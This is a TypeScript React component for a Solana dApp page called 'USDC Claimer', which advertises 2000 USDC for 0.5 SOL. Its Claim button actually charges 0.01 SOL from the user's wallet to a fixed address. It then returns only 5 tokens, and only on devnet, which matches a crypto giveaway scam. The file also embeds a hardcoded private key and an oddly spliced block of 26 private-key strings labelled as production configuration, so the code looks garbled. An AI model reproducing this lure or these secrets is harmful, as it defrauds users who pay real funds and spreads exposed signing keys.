/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3a8tp6DQf6bkL3YNbNgHCf1THdQCVgtfv2kPsnuN1QpQRzh3gNiWFjdSLPEsTJtev3p27wudBZ8Qp7WFFj8Kxewj"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "fy1PTSpzhm9gxef65bUkF4NpSfyNiMK7adu9zsi3u7Ln8DjPnowbTP5XmqqeRJ3CgRmmMXdoR9HMiDHStskazQE",
  "key1": "53XsVeU79ZVwJo3LevBXpugVQD8h1Brx5N93aqAJey8Db9Rb4A7nTLojQ2K72vCetyaSJXU6RG71n3LgzY1MCMHS",
  "key2": "4yGvdYLAwWH4VjQu7j1X9c9CjA4CMeEiViRXsNeYaBK1gXTKFuGwTeB7ZvS7f2DExNSFL3epekv2bs8bSmqKbDLd",
  "key3": "UKQwi4t8FfmSbctrV9exxEauy9ZizvfFBzotLpp9jKHKJeb4zj3L57bQT4hn9k3aUvGmUu6AFJcqbbJ3cvy5UHA",
  "key4": "4agVjidhRz7Hus7UuUC2C7HKsJ7gSimhKpFgtTitbv9gz64nqJ7Vw4Z88zVgJ4vzV2hKVZd1DUXFRhEP2SkKzwr1",
  "key5": "2y3zUX2KQGafQPWd4dRmNATVN2KptAVBH5cMafhswPrtqZoaMRrR5J5yrPpcF8qg6seWvqTrVh7kNPNLjHKG3UcM",
  "key6": "5yfftKyed5LVM1Q4MVBMsSsLyKqdoUb7eWb6Sxo8agJqeFP2PYZBzrYAbxafhFEFUSx3P2vBejrz2sNovMCEP9eN",
  "key7": "5M18DauELJ69rUTjYrPVL2BoeCFU5k2YQfJbyma4aD6BtLwHFd8n5NXMdYZQesm6HT27LmNewUrsx9P1XBtxEiQL",
  "key8": "4BZSBnrLPTs7vHyjWwg2HQ3ZjVesczrudKQbNc3chXDixmR34V7atvpBYMFVmtS3Sh6QLFqLwA1m2f7mfx2yCRRV",
  "key9": "4uRi8rTzJX8LL6cRLE9UQxtLzLYDYN8g8VFR7ywYRCZ6UXCdWWvi37JTgY7swbrdkwsmbJTw5oF8SK5d4hS1wE55",
  "key10": "kHqb87qJzrJxCBfPvGhKZ1f12zLbUQ7fC5dJzeoP8c1Bqj3dRo8Dby99JnmRPnpQyackzEv1YjdxXJYGw6f6y3D",
  "key11": "5gbRgP9W9CQmhKBN8iU1jw3ukGP2EqCzP8LR4oobz1MqoGyMZTPv9uxbTwDxX23JTyB9qtAzKdKBxrWk9u39APe3",
  "key12": "5DgC5WGe4rzfULwUdnqcxUMAPkMdewiWATDKVMf454vr1enWRNufsF1PZuLSjby9awc8rCdCzJRjdGt9AkTtENNi",
  "key13": "5E62NHrHRYbuPkcL6Nv7J7WCUzw48AyTZrhaVUQQKTftD3cRFVtwMrEUTWKF3QH7XThQwTt6aqACsQpRPSit9SJf",
  "key14": "3gG53JZPcuq8SCkwdkGxNXoYLVDyaZCnSoeTyZnKxrP8x2KEYmGQ8RoQvGL48kc3kH5G8ChFSsDN2snix3qLtfp3",
  "key15": "3N44WWZY2w6sCMBAfDEtjJcH6AvrRFAQAvsa84wRF8ZTThHSmHDHy9h9TC1dr367sBqSWidWSsZXYDYfFcGG4E5X",
  "key16": "QKB7Za8qaQJdzgymMiqtpDhV4UdWsAuWWdmi2z2GwiEuqXbZ2kkGruVyE9CwrhLKRGepvivMMhpEx4LiRYNbN8V",
  "key17": "3AAZ9Z8QLDAzbYFWztxnwLj6cD1yjcJLmLWMsuLfWm4Q3kaYsfmyVqYArXNaEsgnScq2ap9RgRSfNMrmFjxm4uki",
  "key18": "31VFZUkznmShycPwFd6nRDAn3HVS7vwjUaBewcVkC23ttFKabp2qt5reM6Mmd8KNQ66yGeoSfucsh8MNkfTLVDnD",
  "key19": "2sJ6SGEYv1Gd8Khdvw1V8s2tDfuHbc9wk43NqpF3GnFxWoGWMgBDdKxLjxwZK5GLEtg1k2QAwSQ9Bbqw3CbYGQZE",
  "key20": "Rt7py64iaEqrDcBuAB5hj3aQutoLpJC8ZMFn9QoMBYHJ2rp1u1ndT7NmmLrVh1AAE5XSFqnuq5SapN8XUXAjsum",
  "key21": "4pp17g5fvyCeY1WWJsvWnsM2kG9m2SyJKL9h4p3NTW1HSfvA2suufsuMYRNA6ALMedYzpZ6EupHEqdnNwn5dXExa",
  "key22": "5DZphHcG8JG7WtKBa2tXpBHXJ72Szpw5713pZZMixaZVzDM5o4wTVUDFXQtHqTJC7ejzVirZFtNgqtykzJtkbzPc",
  "key23": "36vxHqd7bJY3E72DwPH3Pb2kfcB4FBbYixuxw13JPcgWa2PAnAivv237uUwgS2EqcXGMuBKUZMN5P4L2mkFXQhmM",
  "key24": "46Fv79mdFXjkSSbzqhiBJxegaUePAx9UrRzgksouYhKmCAkExMdXrnHQqPAWy5GfV5cQ6fGE2juauQeAaNKow16W",
  "key25": "M7vdNqLKkragN26DMpdcVCF5PDxTvuxChLVmrBBz7FQcAMtmLUiLZsSiKSKmYDVJ1ZigW2gK1HeunGMiwgfWZbi"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
